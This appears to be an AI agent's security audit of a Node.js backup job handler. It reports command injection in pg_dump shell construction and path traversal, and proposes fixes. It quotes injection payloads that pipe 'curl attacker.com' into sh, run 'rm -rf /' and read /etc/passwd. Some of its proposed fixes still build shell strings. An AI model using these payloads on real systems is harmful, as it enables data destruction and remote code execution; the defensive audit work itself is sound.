# Security Audit Report
## US-007: Implement Export Backup Job

**Date:** 2026-01-29
**Auditor:** Maven Security Agent
**Scope:** Export Backup Job Handler (`api-gateway/src/lib/jobs/handlers/export-backup.handler.ts`)
**Files Audited:**
- `/home/ken/api-gateway/src/lib/jobs/handlers/export-backup.handler.ts` (699 lines)
- `/home/ken/api-gateway/src/lib/jobs/__tests__/export-backup.integration.test.ts` (622 lines)

---

## Executive Summary

**Overall Security Score: 6/10**

The export backup job handler has **CRITICAL security vulnerabilities** that MUST be fixed before deployment to production. While the implementation follows some security best practices (parameterized queries, timeout protection), there are **severe command injection vulnerabilities** that could lead to complete system compromise.

**Status:** SECURITY_BLOCK - Critical issues found

---

## Critical Security Issues (Must Fix)

### 1. CRITICAL: Command Injection via Database Password (Line 492)

**Severity:** CRITICAL
**CWE:** CWE-78 (OS Command Injection)
**CVSS Score:** 9.8 (Critical)

**Location:** `generateSqlDump()` function, line 492

**Vulnerable Code:**
```typescript
let pgDumpCommand = `PGPASSWORD=${dbUrl.password} pg_dump`;
pgDumpCommand += ` -h ${dbHost}`;
pgDumpCommand += ` -p ${dbPort}`;
pgDumpCommand += ` -U ${dbUser}`;
pgDumpCommand += ` -d ${dbName}`;
pgDumpCommand += ` -n ${schemaName}`;
pgDumpCommand += ` > ${tempFilePath}`;
```

**Attack Vector:**
An attacker who can control the `DATABASE_URL` environment variable (or any of its parsed components) can inject arbitrary shell commands. For example, if `dbUrl.password` contains: `"; rm -rf /; echo "`, the command becomes:

```bash
PGPASSWORD="; rm -rf /; echo " pg_dump -h localhost ...
```

This allows **Remote Code Execution (RCE)** with the privileges of the application process.

**Attack Scenarios:**
1. **Environment variable poisoning** in development/testing
2. **Supply chain attack** via compromised dependency that modifies `DATABASE_URL`
3. **Insider threat** with access to environment configuration
4. **SQL injection** in another part of the system that leaks/sets `DATABASE_URL`

**Impact:**
- Complete server compromise
- Data exfiltration
- Lateral movement to other systems
- Persistence and backdoor installation

**Recommendation:**
Use environment variable passing instead of shell command construction:

```typescript
// SECURE: Use environment object in exec options
const { exec } = require('child_process');

const pgDumpArgs = [
  `-h ${dbHost}`,
  `-p ${dbPort}`,
  `-U ${dbUser}`,
  `-d ${dbName}`,
  `-n ${schemaName}`,
  '--no-owner',
  '--no-acl',
  `--format=${format === 'tar' ? 't' : 'p'}`
];

const command = `pg_dump ${pgDumpArgs.join(' ')}`;

const result = await execAsync(command, {
  timeout: DEFAULT_BACKUP_CONFIG.maxBackupTime,
  env: {
    ...process.env,
    PGPASSWORD: dbUrl.password  // Safe: passed via env object
  }
});
```

---

### 2. CRITICAL: Command Injection via schemaName Parameter (Lines 474, 497, 567)

**Severity:** CRITICAL
**CWE:** CWE-78 (OS Command Injection)
**CVSS Score:** 8.8 (High)

**Location:** Multiple locations in `generateSqlDump()` and `countTablesInDump()`

**Vulnerable Code:**

**Line 474 - Temp file path construction:**
```typescript
const tempFileName = `backup_${schemaName}_${timestamp}.${format}${compress ? '.gz' : ''}`;
const tempFilePath = join(tmpdir(), tempFileName);
```

**Line 497 - pg_dump schema parameter:**
```typescript
pgDumpCommand += ` -n ${schemaName}`;
```

**Line 567 - grep command with file path:**
```typescript
const command = filePath.endsWith('.gz')
  ? `zcat "${filePath}" | grep -c "CREATE TABLE"`
  : `grep -c "CREATE TABLE" "${filePath}"`;
```

**Attack Vector:**
The `schemaName` parameter comes from the database query result (`id as schema_name` on line 427). If an attacker can:
1. Insert a malicious project ID into the database
2. Bypass input validation on project creation
3. Exploit SQL injection elsewhere to corrupt project IDs

They can inject shell commands. Example malicious project ID:
```
proj-123" | curl http://attacker.com/exfil | sh; echo "
```

**Impact:**
- Arbitrary command execution
- Data exfiltration via DNS/HTTP
- Reverse shell creation
- File system tampering

**Recommendation:**

1. **Validate and sanitize schemaName:**
```typescript
// Add validation function
function sanitizeSchemaName(name: string): string {
  // Only allow alphanumeric, underscores, hyphens
  if (!/^[a-zA-Z0-9_-]+$/.test(name)) {
    throw new Error(`Invalid schema name: ${name}`);
  }
  return name;
}

// Use in generateSqlDump
const sanitizedSchemaName = sanitizeSchemaName(schemaName);
```

2. **Use parameterized shell arguments with shell: false:**
```typescript
import { spawn } from 'child_process';
import { promisify } from 'util';

function execSafe(command: string, args: string[]): Promise<void> {
  return new Promise((resolve, reject) => {
    const proc = spawn(command, args, {
      stdio: 'pipe',
      env: { ...process.env, PGPASSWORD: dbUrl.password }
    });

    proc.on('close', (code) => {
      if (code === 0) resolve();
      else reject(new Error(`Command failed with code ${code}`));
    });
  });
}

// Usage
await execSafe('pg_dump', [
  '-h', dbHost,
  '-p', dbPort,
  '-U', dbUser,
  '-d', dbName,
  '-n', sanitizedSchemaName,
  '--no-owner',
  '--no-acl',
  '--format', format === 'tar' ? 't' : 'p'
]);
```

---

### 3. HIGH: Path Traversal in storage_path Parameter (Line 244, 320-322)

**Severity:** HIGH
**CWE:** CWE-22 (Path Traversal)
**CVSS Score:** 7.5 (High)

**Location:** `generateStoragePath()` function and `exportBackupHandler()`

**Vulnerable Code:**
```typescript
// Line 244: User-controlled storage_path used directly
const storagePath = storage_path || generateStoragePath(project_id, backupFormat);

// Lines 320-322: No path validation
return DEFAULT_BACKUP_CONFIG.storagePathTemplate
  .replace('{project_id}', projectId)  // No validation
  .replace('{timestamp}', `${date}-${timestamp}`)
  .replace('{format}', format);
```

**Attack Vector:**
An attacker can provide a malicious `storage_path` parameter to:
1. **Overwrite system files:** `/etc/passwd`, `/root/.ssh/authorized_keys`
2. **Place backdoors:** `/usr/local/bin/evil.sh`
3. **Exfiltrate data:** `/var/www/html/uploads/backup.sql`

**Example Attack:**
```typescript
await enqueueJob('export_backup', {
  project_id: 'proj-123',
  storage_path: '../../../var/www/html/shell.php'
});
```

**Impact:**
- File system manipulation
- Backdoor implantation
- Data theft via backup placement in accessible directories
- Configuration tampering

**Recommendation:**

1. **Validate storage path:**
```typescript
function validateStoragePath(path: string): void {
  // Reject absolute paths
  if (path.startsWith('/')) {
    throw new Error('Absolute paths not allowed in storage_path');
  }

  // Reject path traversal
  if (path.includes('..')) {
    throw new Error('Path traversal not allowed in storage_path');
  }

  // Reject special characters
  if (!/^[a-zA-Z0-9_/._-]+$/.test(path)) {
    throw new Error('Invalid characters in storage_path');
  }

  // Ensure path is within backups directory
  const normalized = path.replace(/^\/+/, '');
  if (!normalized.startsWith('backups/')) {
    throw new Error('Storage path must be within backups/ directory');
  }
}
```

2. **Use secure path joining:**
```typescript
import { join, normalize } from 'path';

function generateStoragePath(projectId: string, format: string): string {
  const sanitizedProjectId = projectId.replace(/[^a-zA-Z0-9_-]/g, '');
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[1].split('.')[0];
  const date = new Date().toISOString().split('T')[0];

  const safePath = join(
    '/backups',
    sanitizedProjectId,
    `${date}-${timestamp}.${format}`
  );

  // Ensure no path traversal
  const normalized = normalize(safePath);
  if (!normalized.startsWith('/backups/')) {
    throw new Error('Path traversal detected');
  }

  return normalized;
}
```

---

### 4. HIGH: Temp File Command Injection (Line 504, 506)

**Severity:** HIGH
**CWE:** CWE-78 (OS Command Injection)
**CVSS Score:** 7.8 (High)

**Location:** `generateSqlDump()` function

**Vulnerable Code:**
```typescript
if (compress && format === 'sql') {
  pgDumpCommand += ` | gzip > ${tempFilePath}`;
} else {
  pgDumpCommand += ` > ${tempFilePath}`;
}
```

**Attack Vector:**
If `tempFilePath` (constructed from `schemaName` on line 474) contains malicious characters, it can inject commands:

```typescript
// If schemaName = "proj-123 | curl attacker.com | sh"
// tempFilePath becomes "/tmp/backup_proj-123 | curl attacker.com | sh_2025-01-29.sql"
// Command becomes: pg_dump ... > /tmp/backup_proj-123 | curl attacker.com | sh_2025-01-29.sql
```

**Recommendation:**
Use Node.js streams instead of shell redirection:

```typescript
import { createWriteStream } from 'fs';
import { pipeline } from 'stream/promises';
import { spawn } from 'child_process';

async function generateSqlDump(...) {
  const tempFilePath = join(tmpdir(), `backup_${Date.now()}.sql`);

  const pgDump = spawn('pg_dump', [
    '-h', dbHost,
    '-p', dbPort,
    '-U', dbUser,
    '-d', dbName,
    '-n', schemaName,
    '--no-owner',
    '--no-acl'
  ], {
    env: { ...process.env, PGPASSWORD: dbUrl.password }
  });

  const outputStream = createWriteStream(tempFilePath);

  if (compress && format === 'sql') {
    const gzip = spawn('gzip', ['-c']);
    await pipeline(pgDump.stdout, gzip.stdin, outputStream);
  } else {
    await pipeline(pgDump.stdout, outputStream);
  }

  return { filePath: tempFilePath, sizeBytes: ... };
}
```

---

### 5. MEDIUM: Information Disclosure in Error Messages (Lines 211, 284)

**Severity:** MEDIUM
**CWE:** CWE-209 (Information Exposure Through Error Messages)
**CVSS Score:** 5.3 (Medium)

**Location:** Multiple error returns

**Vulnerable Code:**
```typescript
// Line 211
return {
  success: false,
  error: `Project not found or not accessible: ${project_id}`,
};

// Line 284
console.error(`[ExportBackup] Failed to export backup for project ${project_id}:`, errorMessage);
```

**Attack Vector:**
Error messages reveal:
- Internal project IDs (reconnaissance)
- System structure
- File paths (temp file locations)
- Database schema information

**Impact:**
- Information leakage aids reconnaissance
- Helps attackers map system architecture
- Facilitates targeted attacks

**Recommendation:**
Use generic error messages:

```typescript
// Generic error for user
return {
  success: false,
  error: 'Backup operation failed. Please contact support.',
};

// Detailed error for logging (not exposed to user)
console.error(`[ExportBackup] Detailed error:`, {
  projectId,
  error: errorMessage,
  timestamp: new Date().toISOString(),
  stack: error instanceof Error ? error.stack : undefined
});
```

---

### 6. MEDIUM: Insufficient Input Validation on project_id (Lines 189-196)

**Severity:** MEDIUM
**CWE:** CWE-20 (Improper Input Validation)
**CVSS Score:** 5.3 (Medium)

**Location:** `exportBackupHandler()` function

**Vulnerable Code:**
```typescript
const { project_id, format, compress, notify_email, storage_path } = payload as ExportBackupPayload;

if (!project_id) {
  return {
    success: false,
    error: 'Missing required field: project_id',
  };
}
```

**Issue:**
Only checks for presence, not validity. No:
- Length validation
- Character set validation
- Format validation

**Attack Vector:**
- Extremely long project IDs (DoS)
- Special characters (command injection vector)
- SQL injection payloads (though parameterized queries mitigate this)

**Recommendation:**
```typescript
function validateProjectId(projectId: string): void {
  // Length check
  if (projectId.length > 100) {
    throw new Error('Project ID too long');
  }

  // Format check (alphanumeric, hyphens, underscores only)
  if (!/^[a-zA-Z0-9_-]+$/.test(projectId)) {
    throw new Error('Invalid project ID format');
  }

  // Block dangerous patterns
  if (projectId.includes('..') || projectId.includes('/') || projectId.includes('\\')) {
    throw new Error('Project ID contains invalid characters');
  }
}

// Usage
validateProjectId(project_id);
```

---

## Security Best Practices Verified

### 1. SQL Injection Prevention - PASS

**Score:** 10/10

All database queries use parameterized queries correctly:

```typescript
// Line 423-434: Proper parameterization
const queryText = `
  SELECT id, name, id as schema_name
  FROM control_plane.projects
  WHERE id = $1
    AND status = 'ACTIVE'
`;
const result = await query(queryText, [projectId]);
```

**Verification:**
- All user input uses `$1`, `$2` placeholders
- No string concatenation in SQL queries
- Uses `@nextmavens/audit-logs-database` query function
- Consistent pattern throughout codebase

---

### 2. Denial of Service Prevention - PARTIAL PASS

**Score:** 7/10

**Good:**
- Timeout protection implemented (line 140, 514):
  ```typescript
  maxBackupTime: 30 * 60 * 1000, // 30 minutes
  ```
- Backup size limits enforced (line 145, 235-241):
  ```typescript
  maxBackupSize: 10 * 1024 * 1024 * 1024, // 10GB
  ```

**Issues:**
- No rate limiting on job creation
- No concurrent job limits per project
- 10GB backup limit may be too large for production

**Recommendations:**
```typescript
// Add rate limiting
const MAX_CONCURRENT_BACKUPS_PER_PROJECT = 1;

async function checkConcurrentBackups(projectId: string): Promise<void> {
  const result = await query(
    `SELECT COUNT(*) as count FROM control_plane.jobs
     WHERE type = 'export_backup'
       AND payload->>'project_id' = $1
       AND status IN ('pending', 'running')`,
    [projectId]
  );

  if (result.rows[0].count >= MAX_CONCURRENT_BACKUPS_PER_PROJECT) {
    throw new Error('Backup already in progress for this project');
  }
}
```

---

### 3. Authorization - PASS

**Score:** 9/10

**Good:**
- Project status validation (line 430):
  ```typescript
  WHERE id = $1 AND status = 'ACTIVE'
  ```
- Suspended projects rejected (test line 279-288)
- Non-existent projects rejected (test line 268-277)

**Minor Issue:**
- No explicit ownership check (who can request backup for which project?)

**Recommendation:**
Add authorization context:
```typescript
interface ExportBackupPayload extends JobPayload {
  project_id: string;
  requested_by: string;  // User ID requesting the backup
  // ... other fields
}

// Validate user has access to project
await validateProjectAccess(requested_by, project_id);
```

---

### 4. Resource Cleanup - PASS

**Score:** 9/10

**Good:**
- Temp file cleanup in success path (line 276)
- Temp file cleanup in error path (line 287-291)
- Cleanup in pg_dump error handler (line 536)
- Cleanup uses try-catch to prevent cleanup failures from breaking flow

**Minor Issue:**
- Cleanup failures are logged but not tracked
- No orphaned file cleanup on process crash

**Recommendation:**
```typescript
// Add temp file registry for crash recovery
const tempFiles = new Map<string, number>();

function registerTempFile(path: string): void {
  tempFiles.set(path, Date.now());
}

// Periodic cleanup of orphaned files > 1 hour old
setInterval(() => {
  const now = Date.now();
  for (const [path, timestamp] of tempFiles) {
    if (now - timestamp > 3600000) {
      cleanupTempFile(path).catch(() => {});
      tempFiles.delete(path);
    }
  }
}, 300000); // Every 5 minutes
```

---

### 5. Data Integrity - PARTIAL PASS

**Score:** 7/10

**Good:**
- Backup size verification (line 234-241)
- Table count tracking (line 527)
- Metadata includes duration, size, table count (line 262-271)

**Issues:**
- No checksum verification of backup file
- No validation that backup contains expected tables
- No verification that backup is valid SQL/tar

**Recommendations:**
```typescript
async function verifyBackupIntegrity(filePath: string, format: string): Promise<void> {
  if (format === 'sql') {
    // Verify SQL syntax
    const result = await execAsync(`pg_restore --list ${filePath}`);
    if (result.stderr && result.stderr.includes('error')) {
      throw new Error('Backup file is corrupted');
    }
  }

  // Calculate checksum for integrity verification
  const crypto = require('crypto');
  const hash = crypto.createHash('sha256');
  const fileStream = createReadStream(filePath);
  for await (const chunk of fileStream) {
    hash.update(chunk);
  }
  return hash.digest('hex');
}
```

---

## Testing Coverage Analysis

### Security Test Coverage - NEEDS IMPROVEMENT

**Current Tests:**
- Line 590-599: Tests special characters in project ID
- Line 573-586: Tests very long project IDs
- Line 601-619: Tests concurrent jobs for same project

**Missing Security Tests:**
1. Command injection attempts
2. Path traversal attempts
3. SQL injection attempts (should fail)
4. Buffer overflow attempts (extremely long inputs)
5. Timeout behavior
6. Resource exhaustion attacks

**Recommendations:**
```typescript
describe('Security Tests', () => {
  it('should reject project IDs with shell metacharacters', async () => {
    const maliciousIds = [
      'proj-123; rm -rf /',
      'proj-123 | cat /etc/passwd',
      'proj-123`whoami`',
      'proj-123$(curl attacker.com)',
      '../../../etc/passwd'
    ];

    for (const id of maliciousIds) {
      const result = await exportBackupHandler({ project_id: id });
      expect(result.success).toBe(false);
    }
  });

  it('should reject storage_path with path traversal', async () => {
    const result = await exportBackupHandler({
      project_id: await createTestProject(),
      storage_path: '../../../etc/passwd'
    });
    expect(result.success).toBe(false);
  });

  it('should enforce timeout on long-running backups', async () => {
    // Mock pg_dump to hang
    jest.mock('child_process', () => ({
      exec: jest.fn(() => new Promise(() => {})) // Never resolves
    }));

    const result = await exportBackupHandler({ project_id: 'test' });
    expect(result.success).toBe(false);
    expect(result.error).toContain('timeout');
  });
});
```

---

## Compliance & Standards

### OWASP Top 10 (2021) Coverage

| Risk | Status | Notes |
|------|--------|-------|
| A01:2021 - Broken Access Control | PARTIAL | Project access validated, no user authorization |
| A03:2021 - Injection | FAIL | Critical command injection vulnerabilities |
| A04:2021 - Insecure Design | PARTIAL | Good separation of concerns, missing input validation |
| A05:2021 - Security Misconfiguration | PASS | No hardcoded secrets, uses env vars |
| A07:2021 - Identification and Authentication Failures | PASS | Job system handles authentication |
| A08:2021 - Software and Data Integrity Failures | PARTIAL | No checksum verification of backups |

---

## Remediation Priority

### Must Fix Before Production (Critical):
1. Fix command injection in `generateSqlDump()` - Use spawn with args array
2. Fix command injection in `countTablesInDump()` - Use spawn with args array
3. Add input validation for `project_id`, `schemaName`, `storage_path`
4. Add path traversal protection in `generateStoragePath()`

### Should Fix Soon (High):
5. Sanitize error messages to prevent information disclosure
6. Add rate limiting for backup requests
7. Add backup integrity verification (checksums)
8. Add security-focused integration tests

### Nice to Have (Medium):
9. Add authorization context (requested_by user)
10. Add orphaned temp file cleanup
11. Reduce max backup size for production
12. Add detailed security logging (audit trail)

---

## Recommended Code Changes

### Change 1: Secure pg_dump Execution

Replace `generateSqlDump()` function with secure implementation:

```typescript
import { spawn } from 'child_process';
import { createWriteStream } from 'fs';
import { pipeline } from 'stream/promises';

async function generateSqlDump(
  schemaName: string,
  format: string,
  compress: boolean
): Promise<{ filePath: string; sizeBytes: number; tableCount: number }> {
  // Validate schema name
  const sanitizedSchemaName = sanitizeSchemaName(schemaName);

  // Generate safe temp file path
  const tempFilePath = join(tmpdir(), `backup_${Date.now()}.${format}${compress ? '.gz' : ''}`);

  // Get database connection info
  const databaseUrl = process.env.DATABASE_URL;
  if (!databaseUrl) {
    throw new Error('DATABASE_URL environment variable is not set');
  }

  const dbUrl = new URL(databaseUrl);

  // Build pg_dump arguments array (no shell injection risk)
  const pgDumpArgs = [
    '-h', dbUrl.hostname,
    '-p', dbUrl.port || '5432',
    '-U', dbUrl.username,
    '-d', dbUrl.pathname.replace('/', ''),
    '-n', sanitizedSchemaName,
    '--no-owner',
    '--no-acl',
    '--format', format === 'tar' ? 't' : 'p'
  ];

  // Execute pg_dump safely
  const pgDump = spawn('pg_dump', pgDumpArgs, {
    env: { ...process.env, PGPASSWORD: dbUrl.password },
    timeout: DEFAULT_BACKUP_CONFIG.maxBackupTime
  });

  // Create output stream
  const outputStream = createWriteStream(tempFilePath);

  try {
    if (compress && format === 'sql') {
      // Add compression
      const gzip = spawn('gzip', ['-c']);
      await pipeline(pgDump.stdout, gzip.stdin, outputStream);
    } else {
      await pipeline(pgDump.stdout, outputStream);
    }

    // Get file stats
    const fileStats = await stat(tempFilePath);
    const tableCount = await countTablesInDumpSafe(tempFilePath, format);

    return { filePath: tempFilePath, sizeBytes: fileStats.size, tableCount };
  } catch (error) {
    await cleanupTempFile(tempFilePath).catch(() => {});
    throw new Error(`Failed to generate SQL dump: ${error}`);
  }
}
```

### Change 2: Add Input Validation

```typescript
// Add at top of file
const VALIDATIONS = {
  PROJECT_ID_MAX_LENGTH: 100,
  PROJECT_ID_PATTERN: /^[a-zA-Z0-9_-]+$/,
  STORAGE_PATH_PATTERN: /^[a-zA-Z0-9_/._-]+$/,
  SCHEMA_NAME_PATTERN: /^[a-zA-Z0-9_-]+$/
};

function validateProjectId(id: string): void {
  if (!id) throw new Error('Project ID is required');
  if (id.length > VALIDATIONS.PROJECT_ID_MAX_LENGTH) {
    throw new Error('Project ID exceeds maximum length');
  }
  if (!VALIDATIONS.PROJECT_ID_PATTERN.test(id)) {
    throw new Error('Project ID contains invalid characters');
  }
  if (id.includes('..')) {
    throw new Error('Project ID cannot contain path traversal sequences');
  }
}

function validateSchemaName(name: string): void {
  if (!VALIDATIONS.SCHEMA_NAME_PATTERN.test(name)) {
    throw new Error(`Invalid schema name: ${name}`);
  }
}

function validateStoragePath(path: string): void {
  if (!path) return; // Allow empty (will use default)

  if (path.startsWith('/')) {
    throw new Error('Absolute paths not allowed in storage_path');
  }
  if (path.includes('..')) {
    throw new Error('Path traversal not allowed in storage_path');
  }
  if (!VALIDATIONS.STORAGE_PATH_PATTERN.test(path)) {
    throw new Error('Storage path contains invalid characters');
  }
}

// Use in exportBackupHandler
export async function exportBackupHandler(payload: JobPayload): Promise<JobExecutionResult> {
  const { project_id, format, compress, notify_email, storage_path } = payload as ExportBackupPayload;

  // Validate inputs
  try {
    validateProjectId(project_id);
    validateStoragePath(storage_path || '');
  } catch (error) {
    return {
      success: false,
      error: 'Invalid backup parameters'
    };
  }

  // ... rest of function
}
```

---

## Conclusion

The export backup job handler has **critical security vulnerabilities** that must be addressed before production deployment. The primary concern is **command injection** through multiple attack vectors:

1. Database password in shell command construction
2. Schema name parameter in pg_dump command
3. File path in shell redirection
4. User-provided storage_path with no validation

**Recommendation:** Do not deploy to production until critical issues are fixed.

**Next Steps:**
1. Implement secure command execution using `spawn()` with argument arrays
2. Add comprehensive input validation for all user-controlled parameters
3. Add path traversal protection
4. Add security-focused integration tests
5. Re-run security audit after fixes

---

**Audit Status:** SECURITY_BLOCK
**Re-audit Required:** Yes (after fixes)
**Estimated Fix Time:** 4-6 hours

---

*This security audit was performed by the Maven Security Agent as part of Step 10 of the Maven Workflow.*
